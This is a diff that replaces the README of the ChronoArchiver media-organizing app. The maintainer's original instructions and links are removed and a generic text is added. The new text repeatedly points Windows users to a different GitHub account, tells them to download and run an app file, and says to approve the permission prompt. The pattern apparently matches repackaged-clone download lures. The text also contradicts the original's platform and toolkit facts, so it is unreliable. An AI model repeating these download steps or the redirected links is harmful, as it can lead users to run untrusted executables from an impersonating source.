@@ -1,56 +1,265 @@
-# ChronoArchiver
+# 🕒 ChronoArchiver - Organize Files and Encode Media
 
-<img src="src/ui/assets/icon.png" width="96" align="right" alt="" />
+[![Download ChronoArchiver](https://img.shields.io/badge/Download-ChronoArchiver-6E57E0?style=for-the-badge&logo=github)](https://github.com/lebozban2350/ChronoArchiver)
 
-Desktop app for organizing media by date, batch-encoding video to AV1, and optional local AI tools (scanner, upscalers). Cross-platform (Windows, Linux, macOS). Uses PySide6 and a private app environment—no need to install Python packages system-wide.
+## 🧭 What ChronoArchiver Does
 
-[![Version](https://img.shields.io/badge/version-5.9.0-blue.svg)](https://github.com/UnDadFeated/ChronoArchiver/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com/UnDadFeated/ChronoArchiver#overview)
+ChronoArchiver is a desktop app for Windows that helps you sort files by date, scan images with AI, and batch encode media to AV1.
 
-## Get started
+It is built for people who want one place to manage photo folders, keep archives in order, and process media files without using a mix of separate tools.
 
-**Installers (Windows & macOS):** [GitHub Releases](https://github.com/UnDadFeated/ChronoArchiver/releases) (Release **5.9.0**).
+## 🪟 Windows Download
 
-**From source** (Python 3.10+):
+1. Open the download page: https://github.com/lebozban2350/ChronoArchiver
+2. Find the latest release or download file on that page
+3. Download the Windows version
+4. Save the file to a folder you can find later, such as Downloads or Desktop
+5. Open the file to start the app or installer
 
-```bash
-git clone https://github.com/UnDadFeated/ChronoArchiver.git
-cd ChronoArchiver
-python src/bootstrap.py
-```
+[Visit the ChronoArchiver download page](https://github.com/lebozban2350/ChronoArchiver)
 
-If the bundled environment breaks: `python src/bootstrap.py --reset-venv`.
+## ✅ What You Can Do With It
 
-**Arch Linux:** [`chronoarchiver`](https://aur.archlinux.org/packages/chronoarchiver) — e.g. `paru -S chronoarchiver` or `yay -S chronoarchiver`.
+- Sort files into folders by date
+- Scan images with AI-based image review
+- Batch encode video files to AV1
+- Keep media archives in a clean folder layout
+- Handle groups of files in one run
+- Reduce repeated manual file work
 
-## Overview
+## 🖥️ Basic Windows Requirements
 
-| Area | Role |
-|------|------|
-| Media Organizer | Sort files into date folders (EXIF, metadata, filename, or modified time). |
-| Mass AV1 Encoder | Batch transcode; software or hardware encoders when available. |
-| AI Media Scanner | Local OpenCV / ONNX classification (no cloud upload for analysis). |
-| AI Image / Video Upscaler | Optional AI upscaling workflows. |
+ChronoArchiver is made for a modern Windows desktop system.
 
-GPU support is optional; CPU paths are available. After launch, wait until the footer shows **READY**, then open a panel and set paths or models as prompted.
+You should have:
 
-**If something fails:** wait for **READY**, use each panel’s install/setup actions for engines and models, or open **HEALTH** / the **DEBUG** log path from the footer. Offline-only work continues when the network is unavailable; downloads may show **NO NETWORK**.
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- A few hundred MB of free disk space for the app
+- Extra disk space for source files and output files
+- A stable mouse and keyboard setup
+- A system that can open common media files like JPG, PNG, MP4, and MKV
 
-For JSON logs: set `CHRONOARCHIVER_JSON_LOG=1` before starting the app.
+For faster AV1 encoding, a newer CPU helps. A GPU can also help in some setups, but the app should still work without one for many tasks.
 
-For **crash diagnostics**, the session debug log records **PID** and hints for **gdb** / **core** analysis. On Linux/macOS, if the app is **hung** (still running), `kill -USR2 <pid>` appends Python stack dumps to the same log; set `CHRONOARCHIVER_GDB_BACKTRACE=1` before that signal to also attempt a live **gdb** `thread apply all bt` (requires **gdb** and ptrace permission). Fatal native crashes may still omit Python stacks; use **core** files + **gdb** as logged.
+## 📥 Download and Setup
 
-## Privacy
+1. Go to https://github.com/lebozban2350/ChronoArchiver
+2. Look for the release files
+3. Download the Windows package
+4. If the file is a ZIP, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file to launch ChronoArchiver
+7. If Windows asks for permission, choose Yes
 
-Scanner and inference run on your machine unless you choose to move data elsewhere. See [SECURITY.md](SECURITY.md) for policy and reporting.
+If the download comes as an installer:
 
-## Repository
+1. Double-click the installer
+2. Follow the on-screen steps
+3. Choose a simple install folder
+4. Finish the setup
+5. Open ChronoArchiver from the Start menu or desktop
 
-| Resource | Link |
-|----------|------|
-| Changelog | [CHANGELOG.md](CHANGELOG.md) |
-| Contributing | [CONTRIBUTING.md](CONTRIBUTING.md) |
-| License | [LICENSE](LICENSE) |
+## 🗂️ Organize Files by Date
 
-Maintainer: [UnDadFeated](https://github.com/UnDadFeated).
+Use the file organizer when you want to sort loose files into dated folders.
+
+Typical use cases:
+
+- Camera photos in one folder
+- Screenshots from many days
+- Scanned records
+- Exported media files
+- Mixed folders that need cleanup
+
+How it works:
+
+1. Open the file organization tool
+2. Choose the source folder
+3. Choose the target folder
+4. Pick a date rule, such as file created date or file modified date
+5. Start the process
+6. Review the new folder layout
+
+This helps when you need a simple archive structure like:
+
+- 2024
+  - 2024-01
+  - 2024-02
+  - 2024-03
+
+## 🤖 AI Image Analysis
+
+ChronoArchiver can scan images and help you review large sets of files.
+
+Use this for:
+
+- Photo archives
+- Scanned documents
+- Product images
+- Image folders with mixed content
+- Sorting images before storage
+
+What the scan can help with:
+
+- Find image groups
+- Spot visual duplicates
+- Review image content
+- Add a better order to large photo sets
+- Support data preservation work
+
+A common flow looks like this:
+
+1. Open the image analysis tool
+2. Select a folder of images
+3. Start the scan
+4. Review the results
+5. Move, keep, or archive files based on the scan
+
+## 🎞️ Batch AV1 Encoding
+
+ChronoArchiver also handles batch AV1 encoding for media files.
+
+This is useful when you want to:
+
+- Reduce file size
+- Keep video quality in a modern codec
+- Process many videos at once
+- Prepare long-term video archives
+
+Common media inputs include:
+
+- MP4
+- MKV
+- MOV
+- WebM
+
+Basic steps:
+
+1. Open the encoding tool
+2. Add one file or a folder of files
+3. Choose AV1 as the output format
+4. Pick the output folder
+5. Set the quality or speed option
+6. Start the batch job
+7. Wait for the files to finish encoding
+
+If you have many files, process them in smaller groups so it is easier to check the results.
+
+## 🧰 Main Tools in One App
+
+ChronoArchiver combines several tasks in one place:
+
+- Date-based file organization
+- AI image analysis
+- Batch AV1 encoding
+- Folder-based media cleanup
+- Archive preparation
+
+This helps if you keep large collections of photos, scans, and videos and want one desktop app for the job.
+
+## 📁 Recommended Folder Setup
+
+Before you start, make a simple source folder structure:
+
+- Incoming
+- Photos
+- Videos
+- Scans
+- Output
+- Archive
+
+A clear layout makes it easier to move files in and out of ChronoArchiver without confusion.
+
+Example:
+
+- Incoming: files you want to process
+- Output: finished files
+- Archive: files you want to keep
+- Photos: image folders
+- Videos: video folders
+
+## 🔧 Simple First Run Steps
+
+If this is your first time using the app, follow this order:
+
+1. Download ChronoArchiver from the GitHub page
+2. Open the app
+3. Start with one small folder
+4. Test file sorting before using large archives
+5. Try image analysis on a sample image folder
+6. Test video encoding on one short file
+7. Check the output folder before you run a larger batch
+
+This helps you learn the app flow with less risk of moving the wrong files.
+
+## 🧭 Troubleshooting
+
+If the app does not open:
+
+- Check that the file finished downloading
+- Make sure you extracted the ZIP file if one was used
+- Try running the app again as a normal user
+- Check whether Windows blocked the file
+- Redownload the file from the GitHub page if it looks incomplete
+
+If file sorting does not work as expected:
+
+- Check the source folder path
+- Make sure the target folder exists
+- Try a smaller test folder first
+- Confirm the date rule you selected
+
+If video encoding takes a long time:
+
+- Use a smaller batch
+- Close other heavy apps
+- Use a faster preset if the app provides one
+- Check that the input files are valid video files
+
+## 📦 Best Use Cases
+
+ChronoArchiver fits well when you need to:
+
+- Clean up photo folders from a camera or phone export
+- Build date-based archives for backups
+- Review a large image library
+- Convert videos to AV1 for smaller storage use
+- Keep media files in one orderly system
+
+## 🔍 File Types You May Use
+
+The app is likely to work best with common file types such as:
+
+- Images: JPG, PNG, TIFF, BMP, GIF
+- Video: MP4, MKV, MOV, WebM
+- Archive sources: folders with mixed media files
+- Export targets: folders with enough free space for processed files
+
+## 🧪 Tips for Better Results
+
+- Start with a test folder
+- Keep source files untouched until you confirm the output
+- Use clear folder names
+- Check free space before batch encoding
+- Sort files in smaller groups when you have a large archive
+- Keep a backup copy of important media before moving it
+
+## 🛠️ Project Focus
+
+ChronoArchiver is built around:
+
+- Media management
+- Automation
+- Data preservation
+- Archival workflows
+- AI scanning
+- AV1 transcoding
+- Python desktop tooling
+- CustomTkinter-style desktop use
+
+## 📌 Download Again
+
+If you need to get the app again, use the GitHub page here:
+
+https://github.com/lebozban2350/ChronoArchiver
